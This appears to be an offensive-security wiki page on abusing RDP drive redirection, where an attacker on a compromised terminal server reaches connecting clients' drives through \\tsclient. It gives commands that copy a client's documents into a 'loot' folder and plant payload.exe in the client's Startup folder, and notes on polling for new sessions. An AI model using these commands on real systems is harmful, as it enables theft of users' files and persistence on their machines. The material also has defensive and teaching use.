---
title: "Drive redirection: reaching mapped client drives over RDP"
description: "RDP drive redirection maps the client's local drives into the remote session (as tsclient), so files move between them. An attacker who controls the remote host reads and writes the connecting client's mapped drives, stealing files from and planting payloads onto the client, turning a server compromise into reach back into every connecting endpoint."
keywords:
  - drive redirection
  - tsclient
  - rdpdr
  - file access
  - rdp channel
---

# Drive redirection

RDP can map the client's local drives into the remote session over the `rdpdr` channel, exposing them in the session under `\\tsclient\<drive>`. It exists so users can move files between their machine and the server, but it is a two-way reach an attacker abuses from the server side. On a compromised remote host, any session where a user enabled drive redirection exposes that user's client drives for reading (stealing their files) and, where writable, for planting payloads (dropping a startup item or a malicious document onto the client). This turns control of one terminal server into reach back into every endpoint that connects with drive redirection on.

```bash
# in a session on a compromised RDP host, access the connecting client's drives
dir \\tsclient\C                                   # the client's C: drive, if redirected
copy \\tsclient\C\Users\<user>\Documents\* C:\loot\   # steal client files
# plant onto the client's drive for execution on their machine
copy payload.exe "\\tsclient\C\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## Exploitation notes

- `\\tsclient\<drive>` is the mapped-drive path inside the session; enumerate it on a compromised host to find which connecting clients exposed drives and what is reachable.
- Reading steals the client's files (documents, keys, credentials) from the server side; writing to a redirected drive, where permitted, plants persistence or a payload that runs on the client, pivoting from server to endpoint.
- The reach exists only while a session with drive redirection is connected; on a busy terminal server, polling for redirected drives catches users as they connect.
- Combined with [clipboard redirection](clipboard-redirection.md), the device-redirection channels make a compromised RDP host a collection point for every connecting client's data.

## References

- [MS-RDPEFS (file-system virtual channel)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/)
- [HackTricks: RDP drive redirection](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
